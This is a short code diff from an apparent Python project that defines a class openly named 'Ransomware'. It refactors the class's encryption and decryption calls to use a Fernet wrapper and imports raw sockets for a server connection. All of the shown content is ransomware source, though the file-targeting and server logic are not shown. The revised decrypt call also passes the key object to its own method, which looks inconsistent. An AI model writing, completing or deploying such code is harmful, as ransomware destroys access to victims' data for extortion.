@@ -5,7 +5,7 @@ sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')
 
 from time import sleep
 from lib.system import System
-from lib.cryptography.encdec import Fernet, Encrypt, Decrypt
+from lib.cryptography.fernet import Fernet
 from socket import socket, AF_INET, SOCK_STREAM
 
 
@@ -36,10 +36,10 @@ class Ransomware:
                 self.server.close()
     
     def Encrypted(self):
-        Encrypt(self.Private)
+        self.Private.Encrypt()
     
     def Decrypted(self):
-        Decrypt(self.Private)
+        self.Private.Decrypt(self.Private)
 
 
 if __name__ == '__main__':
